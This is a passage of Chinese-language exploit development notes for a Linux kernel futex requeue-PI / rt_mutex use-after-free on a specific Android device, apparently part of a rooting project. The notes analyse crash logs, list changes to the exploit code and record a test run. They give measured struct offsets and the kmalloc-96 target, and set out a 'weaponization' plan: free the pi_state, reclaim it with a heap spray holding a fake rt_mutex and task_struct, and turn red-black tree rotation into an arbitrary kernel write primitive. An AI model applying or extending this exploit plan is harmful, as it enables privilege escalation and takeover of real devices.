  (`__rt_mutex_start_proxy_lock` 自己**不**移除)。
* `3232 futex_wait_requeue_pi()`：`3296 futex_wait_queue_me(hb, &q, to)` **先阻塞**,
  `3314 if (!q.rt_waiter)` 判定是否被 requeue 抢到锁, 否则
  `3343 rt_mutex_wait_proxy_lock()` + `3346 rt_mutex_cleanup_proxy_lock()`。
  **它自己从不调 `__rt_mutex_start_proxy_lock`** —— 这也解开了此前
  "`futex_requeue` vs waiter 线程自己的 `do_futex` 帧"那个悬案：
  `do_futex` 里 `rt_mutex_init_waiter/wait_proxy_lock/cleanup_proxy_lock`
  (`0x818e684/0x818e7f4/0x818e814`)属于**内联进来的 `futex_wait_requeue_pi`**,
  而 `futex_lock_pi` 是**独立符号** `0x8190944`。两者共用 `do_futex_sp+0xc0` 这个
  `rt_waiter` 槽位。

**⇒ W 只要还阻塞在 `futex_wait_queue_me()` 里, 它的 `schedule()` 帧在 `SP0-0x3xx`,
`SP0-0x190` 就一直是干净的、合法的 waiter。消费线程可以慢慢来。**

### 9.5 崩溃链的重新解释

`rtmutex.c:1126 rt_mutex_adjust_pi(task)`(`__sched_setscheduler` → `sched/core.c:5212 if (pi) rt_mutex_adjust_pi(p);`)：

```
1134  waiter = task->pi_blocked_on;                       // W 的悬挂指针(地址合法)
1135  if (!waiter || rt_mutex_waiter_equal(waiter, task_to_waiter(task))) return;
1139  next_lock = waiter->lock;                            // ← 第一次读被冲掉的字段
1145  rt_mutex_adjust_prio_chain(task, MIN_CHAINWALK, NULL, next_lock, NULL, task);
       507   waiter = task->pi_blocked_on;
       537   if (next_lock != waiter->lock) goto out_unlock_pi;   // 相等(同一垃圾值)
       569   if (rt_mutex_waiter_equal(waiter, task_to_waiter(task))) { ... }
       579   lock = waiter->lock;
       585   if (!raw_spin_trylock(&lock->wait_lock)) { ... }      // ← PANIC 点
```

与 `lastkmsg_825.txt` 逐字吻合：`pc : _raw_spin_trylock+0x1c` / `lr : rt_mutex_adjust_prio_chain+0x2d4`,
`x25 = waiter = 0xffffff8047d33ce0 = pt_regs - 0x1e0 = SP0 - 0x190`,
`x21 = x3 = x0 = 0x58f7d8c05d291bc1`(栈金丝雀)。**`waiter->prio` 与 `waiter->lock` 都是被
返回路径冲出来的残值, 所以"崩溃"这件事与 `fake_lock` 塑形毫无关系。**

### 9.6 修正后的攻击链(下一轮要做的)

1. **W 必须一直阻塞在 `FUTEX_WAIT_REQUEUE_PI` 里** —— 不要调 pselect, 不要让 futex 返回。
   (现状：`main.c:341 do_pselect_fake_lock_route()` 紧跟在 futex 之后, 一进去就把
   刚建好的合法 waiter 冲成垃圾。**这是当前 100% 的崩溃原因。**)
2. M 发 `FUTEX_CMP_REQUEUE_PI` ⇒ `-EDEADLK`(chain walk 在 `f_pi_chain` 上撞到
   `rt_mutex_owner(lock) == top_task == W`, `rtmutex.c:600`)⇒ `remove_waiter` 用
   `current=M` ⇒ **W 悬挂**, 而 W 仍在睡。
3. **释放 `pi_state`**：让 `owner` 的 `FUTEX_LOCK_PI(f_pi_chain)` 带超时返回
   (`-ETIMEDOUT`), 再由 `owner` `FUTEX_UNLOCK_PI(f_pi_target)` ⇒ `put_pi_state` ⇒
   `refcount==0` ⇒ `pi_state` 释放 ⇒ **`waiter->lock` 变成悬垂指针**。
4. **回收该 slab**(`sizeof(struct futex_pi_state)` 级), 在
   `offsetof(struct futex_pi_state, pi_mutex)` 处放**假 `struct rt_mutex`**
   (`wait_lock=0`、`waiters.rb_root.rb_node`/`rb_leftmost` 布好、`owner` 指向假 task),
   与现有 `LOCK_OFF`/`W0_OFF`/`FAKE_TASK_OFF` 载荷布局对应。
5. 消费线程 `sched_setattr(W_tid, nice≠0)` ⇒ `waiter->prio(120) != W->prio(121)`
   ⇒ 走过 1135 的 early-out ⇒ chain walk 进**假 lock** ⇒
   `rt_mutex_enqueue`/`rb_insert_color_cached` 旋转 ⇒ 写原语。

**注意 5 的一个陷阱**：现有 `util.c:1038 sched_setattr_tid()` 把 `nice_value` 用
`(void)nice_value;` 丢掉了, 永远 `NORMAL<->BATCH @ nice 0` ⇒ `task->prio` 恒为 120
⇒ `rt_mutex_waiter_equal` **永远早退**。要做 5 必须真的改 nice。

### 9.8 零重启验证实验：**已通过（2026-10-01 13:31）**

实现（本次改动）：

| 文件 | 改动 |
|---|---|
| `src/exploit/main.c` | 新增 `route_hold`/`waiter_futex_returned`/`waiter_futex_ret`/`waiter_futex_errno`；`waiter_thread()` 在 hold 模式下 **futex 返回后立刻置标志并只用 `yield` 空转，不再执行任何 syscall**；新增 `run_hold_oracle()`：先等 `IONSTACK_HOLD_PROBE_MS`(默认 2000) 确认 W 仍阻塞，再上膛消费线程；`IONSTACK_ROUTE_HOLD=1` 打开 |
| `src/exploit/util.c` | `sched_setattr_tid()` 新增 `IONSTACK_CONSUMER_REAL_NICE=1` 分支：真正按 `nice_value` 改 `->prio`（默认关闭，老行为不变） |
| `src/device/ionstack_reroot_device.c` | `environment[]` 补 `IONSTACK_ROUTE_HOLD` / `IONSTACK_CONSUMER_NICE` / `IONSTACK_CONSUMER_REAL_NICE` / `IONSTACK_HOLD_PROBE_MS`（`spawn_child()` 会清环境，**必须显式登记**） |

运行：`IONSTACK_ROUTE_HOLD=1 IONSTACK_CONSUMER_NICE=1 IONSTACK_CONSUMER_REAL_NICE=1
./build/smt878u-ionstack-reroot -s <DEVICE-SERIAL> --t878u-pselect-route --force`

结果（`scratch/runs/hold_20261001_133118.log`）：

```
[*] requeue ret=-1 errno=35 hold=1                 # 35 = EDEADLK ← 预测命中
[+] hold waiter still blocked after 2000ms -- SP0-0x190 intact, arming consumer nice=1
[*] consumer seq=1 tid=4239 nice=1 ret=0 errno=0   # sched_setattr(W, nice=1) 成功
[+] hold-result verdict=waiter_blocked survived=1 armed=1 consumer_calls=1 consumer_success=1 nice=1
[host] device_rc=1 timed_out=0 same_boot=1
[host] final success=0 ... root=0 same_boot=1 no_go=1
```

`boot_id` 前后均为 `c9d3e4da-ccf6-404b-b181-63897101c879`，`uptime` 2365→2495 连续。
**没有 panic、没有重启、没有 oops。**

**这条 `errno=35` 本身就是铁证**：`futex_requeue` 里
`rt_mutex_start_proxy_lock()` 只在 `__rt_mutex_start_proxy_lock()` 返回非 0 时才调
`remove_waiter()`(`rtmutex.c:1805-1806`)，而 `-EDEADLK` 只能由 chain walk 在
`rtmutex.c:600`(`rt_mutex_owner(lock) == top_task == W`，即 `f_pi_chain`)产生。
所以 `remove_waiter` 确实以 `current = M` 执行 ⇒ `M->pi_blocked_on = NULL`、
**`W->pi_blocked_on` 保持悬挂**。加上 W 在 2000 ms 内一直阻塞 ⇒ `do_futex` 帧仍活着
⇒ `SP0-0x190` 完整。

**⇒ 与前 18 轮全部崩溃形成的对照**：唯一变化就是去掉了 pselect 路线，内核立刻不再崩。
**pselect 路线是全部 panic 的唯一成因。**

### 9.9 回收目标（已实测）

* `add x0, x27, #0x10` + `bl rt_mutex_start_proxy_lock`(`0x8190458`)⇒
  **`offsetof(struct futex_pi_state, pi_mutex) = 0x10`**。
  `__randomize_layout` **没有生效**（clang 构建、无 GCC randstruct 插件），字段就是声明序：
  `list@0x00, pi_mutex@0x10, owner@0x30, refcount@0x38, key@0x40` ⇒
  `sizeof ≈ 0x58` ⇒ **kmalloc-96**。
* `rt_mutex_next_owner`(`0x8148fac`)实测：`rb_root.rb_node@0x10`、`rb_leftmost@0x18`、
  `waiter->lock@0x38`(BUG_ON 处)、`waiter->task@0x30` ⇒ **`offset.h` 的 `RTMUTEX_*_OFF` 是对的**
  （`wait_lock` 占 16 字节，不是 4 —— 按头文件推会推错 8 字节）。

**下一步（武器化）**：
1. `owner` 的 `FUTEX_LOCK_PI(f_pi_chain)` 改成**带超时**（≈800 ms），且必须晚于 M 的 requeue
   （否则 `owner->pi_blocked_on == NULL` ⇒ `chain_walk=0` ⇒ `task_blocks_on_rt_mutex` 返回 0
   ⇒ `remove_waiter` **不会被调用** ⇒ 无悬挂）。
2. `owner` 超时返回后 `FUTEX_UNLOCK_PI(f_pi_target)` ⇒ `put_pi_state` ⇒ refcount 0 ⇒
   `pi_state` 释放 ⇒ `waiter->lock` 悬垂。
3. 用 **kmalloc-96** 喷射回收该 chunk，在 `chunk+0x10` 放假 `struct rt_mutex`：
   `wait_lock=0`(16 字节清零)、`waiters.rb_root.rb_node@+0x20`、`waiters.rb_leftmost@+0x28`、
   `owner@+0x30` → 假 `task_struct`（`pi_lock` 清零、`on_rq=0`、`pi_blocked_on=NULL`）。
   `pi_blocked_on=NULL` 让 chain walk 在 `next_lock == NULL` 处干净退出（`rtmutex.c:651`）。
4. 消费线程 `sched_setattr(W_tid, nice=1)` ⇒ 进假 lock ⇒
   `rt_mutex_enqueue` + `rb_insert_color_cached` 旋转 = **写原语**（把假 tree 预置好即可
   让旋转写到任意地址）。
